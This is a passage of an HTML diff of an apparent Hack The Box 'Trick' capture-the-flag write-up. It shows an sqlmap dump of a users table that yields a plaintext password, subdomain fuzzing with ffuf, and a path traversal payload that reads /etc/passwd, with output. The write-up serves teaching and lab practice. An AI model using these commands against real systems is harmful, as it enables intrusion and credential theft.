+</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5"></a>| Column    | Type         |
+</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6"></a>+-----------+--------------+
+</span><span id="__span-23-7"><a id="__codelineno-23-7" name="__codelineno-23-7"></a>| address   | text         |
+</span><span id="__span-23-8"><a id="__codelineno-23-8" name="__codelineno-23-8"></a>| contact   | text         |
+</span><span id="__span-23-9"><a id="__codelineno-23-9" name="__codelineno-23-9"></a>| doctor_id | int(30)      |
+</span><span id="__span-23-10"><a id="__codelineno-23-10" name="__codelineno-23-10"></a>| id        | int(30)      |
+</span><span id="__span-23-11"><a id="__codelineno-23-11" name="__codelineno-23-11"></a>| name      | varchar(200) |
+</span><span id="__span-23-12"><a id="__codelineno-23-12" name="__codelineno-23-12"></a>| password  | varchar(200) |
+</span><span id="__span-23-13"><a id="__codelineno-23-13" name="__codelineno-23-13"></a>| type      | tinyint(1)   |
+</span><span id="__span-23-14"><a id="__codelineno-23-14" name="__codelineno-23-14"></a>| username  | varchar(100) |
+</span><span id="__span-23-15"><a id="__codelineno-23-15" name="__codelineno-23-15"></a>+-----------+--------------+
+</span></code></pre></div></td></tr></table></div>
 <p>And finally we can get usernames and passwords:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>sqlmap<span class="w"> </span>-r<span class="w"> </span>login<span class="w"> </span>-D<span class="w"> </span>payroll_db<span class="w"> </span>-T<span class="w"> </span>users<span class="w"> </span>-C<span class="w"> </span>username,password<span class="w"> </span>--dump
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-24-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1"></a>sqlmap<span class="w"> </span>-r<span class="w"> </span>login<span class="w"> </span>-D<span class="w"> </span>payroll_db<span class="w"> </span>-T<span class="w"> </span>users<span class="w"> </span>-C<span class="w"> </span>username,password<span class="w"> </span>--dump
+</span></code></pre></div></td></tr></table></div>
 <p>Results:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>Database: payroll_db
-</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>Table: users
-</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>[1 entry]
-</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a>+------------+-----------------------+
-</span><span id="__span-25-5"><a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a>| username   | password              |
-</span><span id="__span-25-6"><a id="__codelineno-25-6" name="__codelineno-25-6" href="#__codelineno-25-6"></a>+------------+-----------------------+
-</span><span id="__span-25-7"><a id="__codelineno-25-7" name="__codelineno-25-7" href="#__codelineno-25-7"></a>| Enemigosss | SuperGucciRainbowCake |
-</span><span id="__span-25-8"><a id="__codelineno-25-8" name="__codelineno-25-8" href="#__codelineno-25-8"></a>+------------+-----------------------+
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-25-1">1</a></span>
+<span class="normal"><a href="#__codelineno-25-2">2</a></span>
+<span class="normal"><a href="#__codelineno-25-3">3</a></span>
+<span class="normal"><a href="#__codelineno-25-4">4</a></span>
+<span class="normal"><a href="#__codelineno-25-5">5</a></span>
+<span class="normal"><a href="#__codelineno-25-6">6</a></span>
+<span class="normal"><a href="#__codelineno-25-7">7</a></span>
+<span class="normal"><a href="#__codelineno-25-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1"></a>Database: payroll_db
+</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2"></a>Table: users
+</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3"></a>[1 entry]
+</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4"></a>+------------+-----------------------+
+</span><span id="__span-25-5"><a id="__codelineno-25-5" name="__codelineno-25-5"></a>| username   | password              |
+</span><span id="__span-25-6"><a id="__codelineno-25-6" name="__codelineno-25-6"></a>+------------+-----------------------+
+</span><span id="__span-25-7"><a id="__codelineno-25-7" name="__codelineno-25-7"></a>| Enemigosss | SuperGucciRainbowCake |
+</span><span id="__span-25-8"><a id="__codelineno-25-8" name="__codelineno-25-8"></a>+------------+-----------------------+
+</span></code></pre></div></td></tr></table></div>
 <p>We can login at http://preprod-payroll.trick.htb and see an administration pannel, but other than information disclosure, we cannot find a vuln to get into the server.</p>
 <h4 id="dns-fuzzing">DNS fuzzing</h4>
 <p>Since the subdomain name (http://preprod-payroll.trick.htb/) looks interesting as “payroll” can be replaced with another word, we can consider fuzzing it. Firstly, we will need to figure out the non-existence subdomain query’s error response size. Then we fuzz for a subdomain.</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Host: nonexistent.trick.htb&quot;</span><span class="w"> </span>https://trick.htb<span class="w"> </span><span class="p">|</span><span class="w"> </span>wc<span class="w"> </span>-c
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-26-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Host: nonexistent.trick.htb&quot;</span><span class="w"> </span>https://trick.htb<span class="w"> </span><span class="p">|</span><span class="w"> </span>wc<span class="w"> </span>-c
+</span></code></pre></div></td></tr></table></div>
 <p>And it returns 5480, which is the filter that we will use in th ffuz command.</p>
 <p>Now we can keep on enumerating subdomains with ffuz:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>ffuf<span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000-trick.txt<span class="w"> </span>-u<span class="w"> </span>http://trick.htb<span class="w"> </span>-H<span class="w"> </span>“Host:<span class="w"> </span>FUZZ.trick.htb”<span class="w"> </span>-fs<span class="w"> </span><span class="m">5480</span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-27-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1"></a>ffuf<span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000-trick.txt<span class="w"> </span>-u<span class="w"> </span>http://trick.htb<span class="w"> </span>-H<span class="w"> </span>“Host:<span class="w"> </span>FUZZ.trick.htb”<span class="w"> </span>-fs<span class="w"> </span><span class="m">5480</span>
+</span></code></pre></div></td></tr></table></div>
 <p>If we add -fs 5480 to the command this will filter out the responses that are 5480 bytes in length (which are non-existent subdomains) and we can pinpoint what is a real finding.</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>ffuf<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Host: preprod-FUZZ.trick.htb&quot;</span><span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt<span class="w"> </span>-u<span class="w"> </span>http://10.10.11.166<span class="w"> </span>-fs<span class="w"> </span><span class="m">5480</span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-28-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1"></a>ffuf<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Host: preprod-FUZZ.trick.htb&quot;</span><span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt<span class="w"> </span>-u<span class="w"> </span>http://10.10.11.166<span class="w"> </span>-fs<span class="w"> </span><span class="m">5480</span>
+</span></code></pre></div></td></tr></table></div>
 <p>Adding the filter reveals a new subdomain called preprod-marketing. Results:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>        /&#39;___\  /&#39;___\           /&#39;___\       
-</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>       /\ \__/ /\ \__/  __  __  /\ \__/       
-</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
-</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
-</span><span id="__span-29-5"><a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a>         \ \_\   \ \_\  \ \____/  \ \_\       
-</span><span id="__span-29-6"><a id="__codelineno-29-6" name="__codelineno-29-6" href="#__codelineno-29-6"></a>          \/_/    \/_/   \/___/    \/_/       
-</span><span id="__span-29-7"><a id="__codelineno-29-7" name="__codelineno-29-7" href="#__codelineno-29-7"></a>
-</span><span id="__span-29-8"><a id="__codelineno-29-8" name="__codelineno-29-8" href="#__codelineno-29-8"></a>       v1.5.0 Kali Exclusive &lt;3
-</span><span id="__span-29-9"><a id="__codelineno-29-9" name="__codelineno-29-9" href="#__codelineno-29-9"></a>________________________________________________
-</span><span id="__span-29-10"><a id="__codelineno-29-10" name="__codelineno-29-10" href="#__codelineno-29-10"></a>
-</span><span id="__span-29-11"><a id="__codelineno-29-11" name="__codelineno-29-11" href="#__codelineno-29-11"></a> :: Method           : GET
-</span><span id="__span-29-12"><a id="__codelineno-29-12" name="__codelineno-29-12" href="#__codelineno-29-12"></a> :: URL              : http://10.10.11.166
-</span><span id="__span-29-13"><a id="__codelineno-29-13" name="__codelineno-29-13" href="#__codelineno-29-13"></a> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
-</span><span id="__span-29-14"><a id="__codelineno-29-14" name="__codelineno-29-14" href="#__codelineno-29-14"></a> :: Header           : Host: preprod-FUZZ.trick.htb
-</span><span id="__span-29-15"><a id="__codelineno-29-15" name="__codelineno-29-15" href="#__codelineno-29-15"></a> :: Follow redirects : false
-</span><span id="__span-29-16"><a id="__codelineno-29-16" name="__codelineno-29-16" href="#__codelineno-29-16"></a> :: Calibration      : false
-</span><span id="__span-29-17"><a id="__codelineno-29-17" name="__codelineno-29-17" href="#__codelineno-29-17"></a> :: Timeout          : 10
-</span><span id="__span-29-18"><a id="__codelineno-29-18" name="__codelineno-29-18" href="#__codelineno-29-18"></a> :: Threads          : 40
-</span><span id="__span-29-19"><a id="__codelineno-29-19" name="__codelineno-29-19" href="#__codelineno-29-19"></a> :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
-</span><span id="__span-29-20"><a id="__codelineno-29-20" name="__codelineno-29-20" href="#__codelineno-29-20"></a> :: Filter           : Response size: 5480
-</span><span id="__span-29-21"><a id="__codelineno-29-21" name="__codelineno-29-21" href="#__codelineno-29-21"></a>________________________________________________
-</span><span id="__span-29-22"><a id="__codelineno-29-22" name="__codelineno-29-22" href="#__codelineno-29-22"></a>
-</span><span id="__span-29-23"><a id="__codelineno-29-23" name="__codelineno-29-23" href="#__codelineno-29-23"></a>marketing               [Status: 200, Size: 9660, Words: 3007, Lines: 179, Duration: 267ms]
-</span><span id="__span-29-24"><a id="__codelineno-29-24" name="__codelineno-29-24" href="#__codelineno-29-24"></a>pc169                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 212ms]
-</span><span id="__span-29-25"><a id="__codelineno-29-25" name="__codelineno-29-25" href="#__codelineno-29-25"></a>payroll                 [Status: 302, Size: 9546, Words: 1453, Lines: 267, Duration: 116ms]
-</span><span id="__span-29-26"><a id="__codelineno-29-26" name="__codelineno-29-26" href="#__codelineno-29-26"></a>77msccom                [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 183ms
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-29-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-29-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-29-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-29-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-29-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-29-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-29-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-29-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-29-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-29-10">10</a></span>
+<span class="normal"><a href="#__codelineno-29-11">11</a></span>
+<span class="normal"><a href="#__codelineno-29-12">12</a></span>
+<span class="normal"><a href="#__codelineno-29-13">13</a></span>
+<span class="normal"><a href="#__codelineno-29-14">14</a></span>
+<span class="normal"><a href="#__codelineno-29-15">15</a></span>
+<span class="normal"><a href="#__codelineno-29-16">16</a></span>
+<span class="normal"><a href="#__codelineno-29-17">17</a></span>
+<span class="normal"><a href="#__codelineno-29-18">18</a></span>
+<span class="normal"><a href="#__codelineno-29-19">19</a></span>
+<span class="normal"><a href="#__codelineno-29-20">20</a></span>
+<span class="normal"><a href="#__codelineno-29-21">21</a></span>
+<span class="normal"><a href="#__codelineno-29-22">22</a></span>
+<span class="normal"><a href="#__codelineno-29-23">23</a></span>
+<span class="normal"><a href="#__codelineno-29-24">24</a></span>
+<span class="normal"><a href="#__codelineno-29-25">25</a></span>
+<span class="normal"><a href="#__codelineno-29-26">26</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1"></a>        /&#39;___\  /&#39;___\           /&#39;___\       
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2"></a>       /\ \__/ /\ \__/  __  __  /\ \__/       
+</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3"></a>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4"></a>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+</span><span id="__span-29-5"><a id="__codelineno-29-5" name="__codelineno-29-5"></a>         \ \_\   \ \_\  \ \____/  \ \_\       
+</span><span id="__span-29-6"><a id="__codelineno-29-6" name="__codelineno-29-6"></a>          \/_/    \/_/   \/___/    \/_/       
+</span><span id="__span-29-7"><a id="__codelineno-29-7" name="__codelineno-29-7"></a>
+</span><span id="__span-29-8"><a id="__codelineno-29-8" name="__codelineno-29-8"></a>       v1.5.0 Kali Exclusive &lt;3
+</span><span id="__span-29-9"><a id="__codelineno-29-9" name="__codelineno-29-9"></a>________________________________________________
+</span><span id="__span-29-10"><a id="__codelineno-29-10" name="__codelineno-29-10"></a>
+</span><span id="__span-29-11"><a id="__codelineno-29-11" name="__codelineno-29-11"></a> :: Method           : GET
+</span><span id="__span-29-12"><a id="__codelineno-29-12" name="__codelineno-29-12"></a> :: URL              : http://10.10.11.166
+</span><span id="__span-29-13"><a id="__codelineno-29-13" name="__codelineno-29-13"></a> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
+</span><span id="__span-29-14"><a id="__codelineno-29-14" name="__codelineno-29-14"></a> :: Header           : Host: preprod-FUZZ.trick.htb
+</span><span id="__span-29-15"><a id="__codelineno-29-15" name="__codelineno-29-15"></a> :: Follow redirects : false
+</span><span id="__span-29-16"><a id="__codelineno-29-16" name="__codelineno-29-16"></a> :: Calibration      : false
+</span><span id="__span-29-17"><a id="__codelineno-29-17" name="__codelineno-29-17"></a> :: Timeout          : 10
+</span><span id="__span-29-18"><a id="__codelineno-29-18" name="__codelineno-29-18"></a> :: Threads          : 40
+</span><span id="__span-29-19"><a id="__codelineno-29-19" name="__codelineno-29-19"></a> :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+</span><span id="__span-29-20"><a id="__codelineno-29-20" name="__codelineno-29-20"></a> :: Filter           : Response size: 5480
+</span><span id="__span-29-21"><a id="__codelineno-29-21" name="__codelineno-29-21"></a>________________________________________________
+</span><span id="__span-29-22"><a id="__codelineno-29-22" name="__codelineno-29-22"></a>
+</span><span id="__span-29-23"><a id="__codelineno-29-23" name="__codelineno-29-23"></a>marketing               [Status: 200, Size: 9660, Words: 3007, Lines: 179, Duration: 267ms]
+</span><span id="__span-29-24"><a id="__codelineno-29-24" name="__codelineno-29-24"></a>pc169                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 212ms]
+</span><span id="__span-29-25"><a id="__codelineno-29-25" name="__codelineno-29-25"></a>payroll                 [Status: 302, Size: 9546, Words: 1453, Lines: 267, Duration: 116ms]
+</span><span id="__span-29-26"><a id="__codelineno-29-26" name="__codelineno-29-26"></a>77msccom                [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 183ms
+</span></code></pre></div></td></tr></table></div>
 <h3 id="edit-etchosts-file_1">Edit /etc/hosts file</h3>
 <p>We add the given subdomain to our /etc/hosts file.
 First we open the /etc/hosts file with an editor. For instance, nano.</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>sudo<span class="w"> </span>nano<span class="w"> </span>/etc/hosts
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-30-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1"></a>sudo<span class="w"> </span>nano<span class="w"> </span>/etc/hosts
+</span></code></pre></div></td></tr></table></div>
 <p>We move the cursor to the end and we add these lines:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>10.10.11.166    preprod-marketing.trick.htb
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-31-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1"></a>10.10.11.166    preprod-marketing.trick.htb
+</span></code></pre></div></td></tr></table></div>
 <p>We introduce the address into the browser and we can see a website. In one of the pages there is a path traversal vulnerability:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././..././etc/passwd
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-32-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1"></a>http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././..././etc/passwd
+</span></code></pre></div></td></tr></table></div>
 <p>Results:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>root:x:0:0:root:/root:/bin/bash
-</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a>bin:x:2:2:bin:/bin:/usr/sbin/nologin
-</span><span id="__span-33-4"><a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a>sys:x:3:3:sys:/dev:/usr/sbin/nologin
-</span><span id="__span-33-5"><a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a>sync:x:4:65534:sync:/bin:/bin/sync
-</span><span id="__span-33-6"><a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a>games:x:5:60:games:/usr/games:/usr/sbin/nologin
-</span><span id="__span-33-7"><a id="__codelineno-33-7" name="__codelineno-33-7" href="#__codelineno-33-7"></a>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-</span><span id="__span-33-8"><a id="__codelineno-33-8" name="__codelineno-33-8" href="#__codelineno-33-8"></a>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-</span><span id="__span-33-9"><a id="__codelineno-33-9" name="__codelineno-33-9" href="#__codelineno-33-9"></a>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-</span><span id="__span-33-10"><a id="__codelineno-33-10" name="__codelineno-33-10" href="#__codelineno-33-10"></a>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-</span><span id="__span-33-11"><a id="__codelineno-33-11" name="__codelineno-33-11" href="#__codelineno-33-11"></a>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-</span><span id="__span-33-12"><a id="__codelineno-33-12" name="__codelineno-33-12" href="#__codelineno-33-12"></a>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-</span><span id="__span-33-13"><a id="__codelineno-33-13" name="__codelineno-33-13" href="#__codelineno-33-13"></a>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-</span><span id="__span-33-14"><a id="__codelineno-33-14" name="__codelineno-33-14" href="#__codelineno-33-14"></a>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-</span><span id="__span-33-15"><a id="__codelineno-33-15" name="__codelineno-33-15" href="#__codelineno-33-15"></a>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-</span><span id="__span-33-16"><a id="__codelineno-33-16" name="__codelineno-33-16" href="#__codelineno-33-16"></a>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-</span><span id="__span-33-17"><a id="__codelineno-33-17" name="__codelineno-33-17" href="#__codelineno-33-17"></a>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-</span><span id="__span-33-18"><a id="__codelineno-33-18" name="__codelineno-33-18" href="#__codelineno-33-18"></a>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-</span><span id="__span-33-19"><a id="__codelineno-33-19" name="__codelineno-33-19" href="#__codelineno-33-19"></a>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
-</span><span id="__span-33-20"><a id="__codelineno-33-20" name="__codelineno-33-20" href="#__codelineno-33-20"></a>systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
-</span><span id="__span-33-21"><a id="__codelineno-33-21" name="__codelineno-33-21" href="#__codelineno-33-21"></a>systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
-</span><span id="__span-33-22"><a id="__codelineno-33-22" name="__codelineno-33-22" href="#__codelineno-33-22"></a>systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
-</span><span id="__span-33-23"><a id="__codelineno-33-23" name="__codelineno-33-23" href="#__codelineno-33-23"></a>messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
-</span><span id="__span-33-24"><a id="__codelineno-33-24" name="__codelineno-33-24" href="#__codelineno-33-24"></a>tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false
-</span><span id="__span-33-25"><a id="__codelineno-33-25" name="__codelineno-33-25" href="#__codelineno-33-25"></a>dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
-</span><span id="__span-33-26"><a id="__codelineno-33-26" name="__codelineno-33-26" href="#__codelineno-33-26"></a>usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
-</span><span id="__span-33-27"><a id="__codelineno-33-27" name="__codelineno-33-27" href="#__codelineno-33-27"></a>rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
-</span><span id="__span-33-28"><a id="__codelineno-33-28" name="__codelineno-33-28" href="#__codelineno-33-28"></a>pulse:x:109:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
-</span><span id="__span-33-29"><a id="__codelineno-33-29" name="__codelineno-33-29" href="#__codelineno-33-29"></a>speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
-</span><span id="__span-33-30"><a id="__codelineno-33-30" name="__codelineno-33-30" href="#__codelineno-33-30"></a>avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
-</span><span id="__span-33-31"><a id="__codelineno-33-31" name="__codelineno-33-31" href="#__codelineno-33-31"></a>saned:x:112:121::/var/lib/saned:/usr/sbin/nologin
-</span><span id="__span-33-32"><a id="__codelineno-33-32" name="__codelineno-33-32" href="#__codelineno-33-32"></a>colord:x:113:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
-</span><span id="__span-33-33"><a id="__codelineno-33-33" name="__codelineno-33-33" href="#__codelineno-33-33"></a>geoclue:x:114:123::/var/lib/geoclue:/usr/sbin/nologin
-</span><span id="__span-33-34"><a id="__codelineno-33-34" name="__codelineno-33-34" href="#__codelineno-33-34"></a>hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
-</span><span id="__span-33-35"><a id="__codelineno-33-35" name="__codelineno-33-35" href="#__codelineno-33-35"></a>Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
-</span><span id="__span-33-36"><a id="__codelineno-33-36" name="__codelineno-33-36" href="#__codelineno-33-36"></a>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
-</span><span id="__span-33-37"><a id="__codelineno-33-37" name="__codelineno-33-37" href="#__codelineno-33-37"></a>mysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/false
-</span><span id="__span-33-38"><a id="__codelineno-33-38" name="__codelineno-33-38" href="#__codelineno-33-38"></a>sshd:x:118:65534::/run/sshd:/usr/sbin/nologin
-</span><span id="__span-33-39"><a id="__codelineno-33-39" name="__codelineno-33-39" href="#__codelineno-33-39"></a>postfix:x:119:126::/var/spool/postfix:/usr/sbin/nologin
-</span><span id="__span-33-40"><a id="__codelineno-33-40" name="__codelineno-33-40" href="#__codelineno-33-40"></a>bind:x:120:128::/var/cache/bind:/usr/sbin/nologin
-</span><span id="__span-33-41"><a id="__codelineno-33-41" name="__codelineno-33-41" href="#__codelineno-33-41"></a>michael:x:1001:1001::/home/michael:/bin/bash
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-33-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-33-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-33-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-33-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-33-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-33-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-33-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-33-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-33-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-33-10">10</a></span>
+<span class="normal"><a href="#__codelineno-33-11">11</a></span>
+<span class="normal"><a href="#__codelineno-33-12">12</a></span>
+<span class="normal"><a href="#__codelineno-33-13">13</a></span>
+<span class="normal"><a href="#__codelineno-33-14">14</a></span>
+<span class="normal"><a href="#__codelineno-33-15">15</a></span>
+<span class="normal"><a href="#__codelineno-33-16">16</a></span>
+<span class="normal"><a href="#__codelineno-33-17">17</a></span>
+<span class="normal"><a href="#__codelineno-33-18">18</a></span>
+<span class="normal"><a href="#__codelineno-33-19">19</a></span>
+<span class="normal"><a href="#__codelineno-33-20">20</a></span>
+<span class="normal"><a href="#__codelineno-33-21">21</a></span>
+<span class="normal"><a href="#__codelineno-33-22">22</a></span>
+<span class="normal"><a href="#__codelineno-33-23">23</a></span>
+<span class="normal"><a href="#__codelineno-33-24">24</a></span>
+<span class="normal"><a href="#__codelineno-33-25">25</a></span>
+<span class="normal"><a href="#__codelineno-33-26">26</a></span>
+<span class="normal"><a href="#__codelineno-33-27">27</a></span>
+<span class="normal"><a href="#__codelineno-33-28">28</a></span>
+<span class="normal"><a href="#__codelineno-33-29">29</a></span>
+<span class="normal"><a href="#__codelineno-33-30">30</a></span>
